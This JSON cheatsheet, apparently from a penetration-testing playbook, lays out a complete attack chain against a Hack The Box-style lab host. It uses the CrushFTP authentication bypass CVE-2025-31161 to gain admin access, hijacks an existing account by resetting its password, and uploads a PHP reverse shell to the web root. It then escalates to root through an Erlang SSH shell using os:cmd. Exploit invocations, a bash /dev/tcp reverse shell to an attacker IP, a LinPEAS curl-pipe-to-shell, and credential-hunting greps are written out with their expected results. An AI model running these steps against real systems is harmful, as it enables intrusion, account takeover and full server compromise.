{
  "cheatsheets": [
    {
      "id": "crushftp-exploitation",
      "name": "CrushFTP Authentication Bypass to Root",
      "description": "Complete exploitation guide for CVE-2025-31161 CrushFTP authentication bypass through Erlang privilege escalation. Critical insight: When exploiting CrushFTP auth bypass, do NOT create new users - they have empty VFS. Instead, hijack existing user accounts to preserve file access mappings.",
      "educational_header": {
        "how_to_recognize": [
          "CrushFTP web interface detected (usually /WebInterface/login.html)",
          "Version string shows < 11.3.1 (vulnerable to CVE-2025-31161)",
          "Server headers or page source reveal CrushFTP branding",
          "FTP-related subdomain (ftp.*, files.*, transfer.*) with web interface",
          "Port 9090 or custom port serving CrushFTP web UI",
          "Login form with CrushFTP styling and JavaScript",
          "Erlang Port Mapper Daemon (EPMD) on port 4369 indicating Erlang services"
        ],
        "when_to_look_for": [
          "During subdomain enumeration when ftp.* or files.* vhosts discovered",
          "When port scan reveals unusual web ports (8080, 9090) with file transfer UI",
          "After identifying CrushFTP version vulnerable to CVE-2025-31161",
          "When FTP ports (21, 990) are closed but web interface is available",
          "During security assessment when machine has file sharing component",
          "When EPMD (port 4369) detected alongside web services (potential Erlang privesc)",
          "After gaining admin access to CrushFTP but finding empty file browser (VFS issue)"
        ]
      },
      "scenarios": [
        {
          "title": "Scenario 1: CVE-2025-31161 Authentication Bypass - Initial Admin Access",
          "context": "Target: Linux server running CrushFTP 11.W.657 on web interface. Version confirmed vulnerable to CVE-2025-31161 (CVSS 9.8). No credentials available. Objective: Gain admin access to CrushFTP management panel. Access level: Unauthenticated, external attacker.",
          "approach": "**Phase 1 - Identify CrushFTP and Version (1-2 min):**\n\n1. Confirm CrushFTP is running:\n   - `whatweb http://ftp.target.htb/`\n   - Look for: CrushFTP, /WebInterface/, version strings\n   - Or: `curl -s http://ftp.target.htb/ | grep -i crushftp`\n\n2. Check version in page source:\n   - Version appears in HTML comments or JavaScript\n   - Look for: 11.W.657 or similar (vulnerable < 11.3.1)\n   - Path: /WebInterface/login.html often reveals version\n\n**Phase 2 - Run CVE-2025-31161 Exploit (2-3 min):**\n\n3. Clone and run exploit:\n   ```bash\n   git clone https://github.com/Immersive-Labs-Sec/CVE-2025-31161\n   cd CVE-2025-31161\n   python3 cve-2025-31161.py --target_host ftp.target.htb --port 80\n   ```\n   - Default creates: AuthBypassAccount:CorrectHorseBatteryStaple\n   - Or specify custom creds: `--username hacker --password Hacker123!`\n\n4. Verify exploit success:\n   - Look for: 'User created successfully' message\n   - Try logging in at /WebInterface/login.html\n   - Should see admin panel with user management\n\n**Phase 3 - Important Realization (Critical):**\n\n5. Check file browser after login:\n   - Navigate to file browser/file manager\n   - **EXPECTED PROBLEM**: Empty directory listing!\n   - This is because newly created users have NO VFS mappings\n   - Proceed to Scenario 2 for solution",
          "commands": [
            "whatweb-single",
            "crushftp-cve-2025-31161-exploit"
          ],
          "expected_outcome": "**Success Timeline (3-5 min):** Version identification (1-2 min) -> Exploit execution (1-2 min) -> Admin panel access (1 min). **Success Indicators:** (1) CrushFTP version < 11.3.1 confirmed, (2) Exploit reports user creation successful, (3) Can login to /WebInterface/ with created credentials, (4) Admin functions visible (UserManager, Jobs, etc.). **Common Failures:** (1) 'Connection refused' -> Check correct port (80, 443, 8080, 9090). (2) 'User already exists' -> Change username in exploit. (3) 'WAF blocking' -> Try HTTPS or different port. (4) 'Empty file browser' -> This is EXPECTED! See Scenario 2.",
          "why_this_works": "**CVE-2025-31161 Mechanics:** The vulnerability exists in AWS4-HMAC-SHA256 authentication handling. CrushFTP improperly validates the Authorization header, allowing attackers to bypass authentication entirely. The exploit crafts a malicious AWS4-HMAC-SHA256 Credential header that tricks CrushFTP into treating the request as authenticated with admin privileges. **Why Empty VFS:** CrushFTP uses Virtual File System (VFS) to control what files each user can access. When creating a new user via the exploit, no VFS mappings are defined - the user exists but has no file access permissions. This is a critical oversight many attackers make. **Practical Relevance:** Understanding that exploitation doesn't end at 'admin access' is key. The VFS issue teaches that application-level access != filesystem access."
        },
        {
          "title": "Scenario 2: User Hijacking for VFS Access - The Critical Insight",
          "context": "Target: CrushFTP admin panel accessed via CVE-2025-31161. File browser shows empty listing (no VFS access). Existing users visible in UserManager: ben, jenna, crushadmin. Objective: Gain file access by hijacking an existing user's VFS mappings. Access level: Admin panel access, no file access.",
          "approach": "**Phase 1 - Understand the VFS Problem (1 min):**\n\n1. Why new users fail:\n   - CrushFTP VFS (Virtual File System) controls file access\n   - Each user has VFS mappings to specific directories\n   - NEW users created via exploit = EMPTY VFS = no file access\n   - EXISTING users = PRESERVED VFS = inherited file access\n\n2. The solution:\n   - Don't create new users for file access\n   - MODIFY existing user's password instead\n   - This preserves their VFS mappings\n\n**Phase 2 - Enumerate Existing Users (1-2 min):**\n\n3. Access UserManager:\n   - Navigate to /WebInterface/UserManager/\n   - Or: Admin panel -> Users -> User Management\n\n4. List existing users:\n   - Note all usernames (e.g., ben, jenna, crushadmin)\n   - Look for users with VFS paths like /IT/, /webProd/, /data/\n   - Select target user (e.g., 'ben' with /webProd/ access)\n\n**Phase 3 - Hijack User Account (2-3 min):**\n\n5. Modify target user's password:\n   - Click on target user (e.g., 'ben')\n   - Find 'Password' or 'Generate Password' section\n   - Click 'Generate random Password'\n   - Replace with your password (e.g., 'Hacked123!')\n   - Click 'Use this password'\n   - Click 'Save' or 'Apply'\n\n6. Logout and login as hijacked user:\n   - Logout from admin account\n   - Login as: ben / Hacked123!\n   - File browser should now show directories!\n\n**Phase 4 - Verify VFS Access (1 min):**\n\n7. Browse available directories:\n   - Look for /webProd/ (maps to web server root)\n   - Look for /IT/, /data/, or other useful dirs\n   - Verify write access by uploading test file",
          "commands": [
            "crushftp-admin-user-modify"
          ],
          "expected_outcome": "**Success Timeline (5-7 min):** User enumeration (1-2 min) -> Password modification (2-3 min) -> Login verification (1-2 min). **Success Indicators:** (1) Existing users visible in UserManager, (2) Password change completes without error, (3) Can logout and login as hijacked user, (4) File browser shows directories (not empty!), (5) /webProd/ or similar web-accessible directory visible. **Common Failures:** (1) 'Access denied' on password change -> User in protected group, try different user. (2) Still empty after login -> Wrong user, check VFS mappings in UserManager. (3) 'User locked' -> Some users may be disabled, select active user. **CRITICAL LESSON:** Creating new users = EMPTY VFS. Modifying existing users = PRESERVED VFS. This is the KEY insight for CrushFTP exploitation!",
          "why_this_works": "**VFS Architecture:** CrushFTP's Virtual File System is a per-user configuration that maps virtual paths to actual filesystem paths. Example: User 'ben' has VFS mapping '/' -> '/app/data/', '/webProd' -> '/var/www/html/'. When you create a NEW user, no VFS entries exist - they literally cannot see any files. **Why Hijacking Works:** Modifying an existing user's password changes ONLY the authentication credential. All other user properties (VFS mappings, permissions, quotas) remain intact. You inherit their complete file access configuration. **Security Implication:** This is a design feature for administrators but becomes critical vulnerability when combined with auth bypass. Admin access + user modification = full file access inheritance."
        },
        {
          "title": "Scenario 3: webProd to RCE - Uploading Shell to Web Root",
          "context": "Target: Logged into CrushFTP as hijacked user (ben). VFS shows /webProd/ directory which maps to main web server document root. Main web server runs PHP on port 80 (soulmate.htb). Objective: Upload PHP webshell and trigger for reverse shell. Access level: CrushFTP user with webProd write access.",
          "approach": "**Phase 1 - Prepare PHP Reverse Shell (1-2 min):**\n\n1. Download pentestmonkey PHP reverse shell:\n   ```bash\n   wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php\n   ```\n\n2. Edit shell.php with your IP and port:\n   - Change $ip = 'YOUR_IP'\n   - Change $port = YOUR_PORT\n   - Save file\n\n**Phase 2 - Upload via CrushFTP (1-2 min):**\n\n3. Navigate to /webProd/ in CrushFTP file browser:\n   - This directory maps to main web server root\n   - Should see existing web files (index.php, assets/, etc.)\n\n4. Upload PHP shell:\n   - Click 'Add File' or upload button\n   - Select shell.php\n   - Verify upload shows in file listing\n   - Note: File must have .php extension\n\n**Phase 3 - Trigger Reverse Shell (1-2 min):**\n\n5. Start listener on attacker machine:\n   ```bash\n   nc -nlvp 4444\n   ```\n\n6. Trigger shell via MAIN web server (NOT CrushFTP!):\n   - Access: http://soulmate.htb/shell.php\n   - IMPORTANT: Use main domain, not ftp.soulmate.htb\n   - CrushFTP won't execute PHP - main Apache/Nginx will\n\n7. Verify shell connection:\n   - Listener receives connection\n   - `whoami` shows www-data\n   - You now have initial foothold!\n\n**Phase 4 - Upgrade Shell (Optional):**\n\n8. Stabilize shell:\n   ```bash\n   python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n   export TERM=xterm\n   # Ctrl+Z, then:\n   stty raw -echo; fg\n   ```",
          "commands": [
            "crushftp-webprod-upload",
            "nc-listener",
            "bash-reverse-shell"
          ],
          "expected_outcome": "**Success Timeline (4-6 min):** Shell preparation (1-2 min) -> Upload (1-2 min) -> Trigger and connect (1-2 min). **Success Indicators:** (1) Shell.php visible in /webProd/ listing, (2) File accessible via main web server URL, (3) Netcat listener receives connection, (4) Commands execute as www-data. **Common Failures:** (1) 'Upload denied' -> User doesn't have write permission, try different directory. (2) 404 on shell.php -> Wrong web root mapping, check other VFS directories. (3) Shell downloaded instead of executed -> .php extension blocked, try .phtml or .phar. (4) No connection -> Firewall blocking outbound, try common ports (80, 443, 53). (5) 'Triggering on CrushFTP port' -> WRONG! Trigger on MAIN web server port (80/443).",
          "why_this_works": "**VFS to Filesystem Mapping:** CrushFTP's /webProd/ VFS path maps to actual filesystem path (e.g., /var/www/html/). Files uploaded through CrushFTP are written to this real path. **Web Server Execution:** The main web server (Apache/Nginx) serves files from its document root. When you upload shell.php to /webProd/, it lands in the web root. Accessing via HTTP triggers PHP execution. **Why CrushFTP Won't Execute:** CrushFTP serves its own web interface but doesn't process PHP. You must trigger the shell through the actual web server (different port/domain). This is a common mistake - always identify which service will execute your payload."
        },
        {
          "title": "Scenario 4: Erlang os:cmd() Privilege Escalation - Root Shell",
          "context": "Target: Initial foothold as www-data on Linux server. LinPEAS identifies Erlang SSH service on port 2222 (internal only). Credentials found in /usr/local/lib/ config files. EPMD (port 4369) detected during initial enumeration. Objective: Escalate to root via Erlang shell. Access level: www-data shell, local network access.",
          "approach": "**Phase 1 - Enumerate for Erlang (2-3 min):**\n\n1. Run LinPEAS and search output:\n   ```bash\n   curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh | tee /dev/shm/linpeas.txt\n   grep -i erlang /dev/shm/linpeas.txt\n   grep -i 'port 2222\\|:2222' /dev/shm/linpeas.txt\n   ```\n\n2. Check for Erlang processes:\n   ```bash\n   ps aux | grep -i erlang\n   netstat -tlnp | grep 2222\n   ```\n\n**Phase 2 - Find Erlang Credentials (2-3 min):**\n\n3. Search for hardcoded credentials:\n   ```bash\n   grep -r 'user_passwords\\|password' /usr/local/lib/ 2>/dev/null\n   grep -r 'ssh_runner\\|erlang' /opt/ /etc/ 2>/dev/null\n   find / -name '*.config' -exec grep -l password {} \\; 2>/dev/null\n   ```\n\n4. Common Erlang credential locations:\n   - /usr/local/lib/erlang/*/priv/*.config\n   - /opt/*/config/*.config\n   - /etc/erlang/*\n   - Environment variables in process\n\n**Phase 3 - SSH to Erlang Shell (1-2 min):**\n\n5. Connect to Erlang SSH port:\n   ```bash\n   ssh user@localhost -p 2222\n   ```\n   - Use discovered credentials\n   - May see 'Eshell V15.x.x' prompt\n   - Prompt shows: `(ssh_runner@hostname)1>`\n\n6. Verify Erlang shell access:\n   - Erlang commands end with period (.)\n   - Test: `io:format(\"test\").`\n   - Should print 'test'\n\n**Phase 4 - Execute Commands as Root (2-3 min):**\n\n7. Check current user via os:cmd():\n   ```erlang\n   os:cmd(\"id\").\n   ```\n   - Should return: `uid=0(root) gid=0(root)`\n   - If root, proceed to shell\n\n8. Get reverse shell as root:\n   - Start listener: `nc -nlvp 4445`\n   - Execute from Erlang:\n   ```erlang\n   os:cmd(\"bash -c 'bash -i >& /dev/tcp/10.10.14.5/4445 0>&1'\").\n   ```\n   - REMEMBER: Commands MUST end with period!\n\n9. Or read root flag directly:\n   ```erlang\n   os:cmd(\"cat /root/root.txt\").\n   ```",
          "commands": [
            "linux-linpeas",
            "linpeas-credential-grep",
            "erlang-shell-oscmd"
          ],
          "expected_outcome": "**Success Timeline (7-12 min):** LinPEAS enumeration (2-3 min) -> Credential discovery (2-3 min) -> Erlang SSH access (1-2 min) -> Root shell (2-3 min). **Success Indicators:** (1) Erlang service/port identified, (2) Credentials found in config files, (3) SSH to port 2222 succeeds, (4) os:cmd(\"id\"). returns uid=0, (5) Reverse shell connects as root. **Common Failures:** (1) 'Connection refused on 2222' -> Port only local, must have initial foothold first. (2) 'Authentication failed' -> Wrong credentials, search more thoroughly. (3) 'os:cmd undefined' -> Restricted Erlang shell, try other modules. (4) Syntax error -> FORGOT THE PERIOD! Erlang commands must end with `.`",
          "why_this_works": "**Erlang SSH Service:** Erlang/OTP includes an SSH server for remote shell access. Often used for debugging or administration. When misconfigured, provides full Erlang shell access. **os:cmd() Function:** Erlang's os:cmd() executes shell commands and returns output. If Erlang process runs as root (common for system services), commands execute with root privileges. **Why Credentials in Configs:** Erlang applications often store SSH credentials in plaintext config files. Developers prioritize functionality over security. Common patterns: user_passwords lists, embedded auth configs. **Privilege Escalation Chain:** www-data foothold -> Find credentials -> SSH to Erlang -> os:cmd() as root. This is a legitimate admin interface being abused through credential discovery."
        }
      ],
      "sections": [
        {
          "title": "Phase 1: CrushFTP Identification and Version Check",
          "notes": "Before exploitation, confirm CrushFTP is running and version is vulnerable. CVE-2025-31161 affects versions prior to 11.3.1. Check multiple sources for version info.",
          "commands": [
            {
              "id": "whatweb-single",
              "example": "whatweb http://ftp.soulmate.htb/ -v",
              "shows": "CrushFTP identification, version strings, server headers"
            },
            {
              "id": "curl-headers",
              "example": "curl -I http://ftp.soulmate.htb/WebInterface/login.html",
              "shows": "Server headers, CrushFTP identification"
            },
            {
              "id": "curl-source-grep",
              "example": "curl -s http://ftp.soulmate.htb/ | grep -i 'version\\|crushftp'",
              "shows": "Version strings in page source (e.g., 11.W.657)"
            }
          ]
        },
        {
          "title": "Phase 2: CVE-2025-31161 Authentication Bypass",
          "notes": "The exploit abuses AWS4-HMAC-SHA256 authentication handling to create admin users. Created users have WEB_ADMIN privileges but EMPTY VFS. This is step 1 - do NOT expect file access yet.",
          "commands": [
            {
              "id": "crushftp-cve-2025-31161-exploit",
              "example": "python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --username hacker --password Hacker123!",
              "shows": "User 'hacker' created successfully with WEB_ADMIN privileges"
            },
            {
              "id": "curl-crushftp-login-test",
              "example": "curl -c cookies.txt -b cookies.txt 'http://ftp.soulmate.htb/WebInterface/function/?command=login&username=hacker&password=Hacker123!'",
              "shows": "Login success, session cookie set"
            }
          ]
        },
        {
          "title": "Phase 3: User Hijacking for VFS Access (CRITICAL)",
          "notes": "THIS IS THE KEY INSIGHT: Do NOT create new users for file access. Modify existing user passwords to inherit their VFS mappings. New users = empty VFS. Modified users = preserved VFS.",
          "commands": [
            {
              "id": "crushftp-admin-user-modify",
              "example": "In UserManager: Select 'ben' -> Generate Password -> Enter 'Hacked123!' -> Use this password -> Save",
              "shows": "Password updated successfully (VFS preserved)"
            },
            {
              "id": "crushftp-list-users",
              "example": "Navigate to /WebInterface/UserManager/ in browser after admin login",
              "shows": "List of existing users: ben, jenna, crushadmin with their VFS mappings"
            }
          ]
        },
        {
          "title": "Phase 4: Webshell Upload and Execution",
          "notes": "Upload PHP shell to /webProd/ (or equivalent web-accessible VFS path). Trigger via MAIN web server - not CrushFTP port. CrushFTP doesn't execute PHP.",
          "commands": [
            {
              "id": "crushftp-webprod-upload",
              "example": "In file browser: Navigate to /webProd/ -> Add File -> Select shell.php -> Upload",
              "shows": "shell.php appears in /webProd/ directory listing"
            },
            {
              "id": "nc-listener",
              "example": "nc -nlvp 4444",
              "shows": "Listening on 0.0.0.0:4444"
            },
            {
              "id": "curl-trigger-shell",
              "example": "curl http://soulmate.htb/shell.php",
              "shows": "Connection received on listener as www-data"
            }
          ]
        },
        {
          "title": "Phase 5: Erlang Privilege Escalation",
          "notes": "After initial foothold, search for Erlang SSH service (often port 2222) and credentials in config files. os:cmd() provides root command execution. Remember: Erlang commands end with period (.).",
          "commands": [
            {
              "id": "linpeas-credential-grep",
              "example": "grep -r 'user_passwords\\|password' /usr/local/lib/ /opt/ 2>/dev/null | head -20",
              "shows": "Hardcoded credentials in Erlang config files"
            },
            {
              "id": "ssh-erlang-port",
              "example": "ssh user@localhost -p 2222",
              "shows": "Eshell V15.x.x (ssh_runner@hostname) prompt"
            },
            {
              "id": "erlang-shell-oscmd",
              "example": "os:cmd(\"id\").",
              "shows": "uid=0(root) gid=0(root) groups=0(root)"
            },
            {
              "id": "erlang-reverse-shell",
              "example": "os:cmd(\"bash -c 'bash -i >& /dev/tcp/10.10.14.5/4445 0>&1'\").",
              "shows": "Root shell received on listener"
            }
          ]
        }
      ],
      "tags": [
        "CVE-2025-31161",
        "CRUSHFTP",
        "AUTH_BYPASS",
        "VFS",
        "WEBSHELL",
        "ERLANG",
        "PRIVILEGE_ESCALATION",
        "HTB",
        "LINUX",
        "PRIORITY:HIGH"
      ]
    }
  ]
}
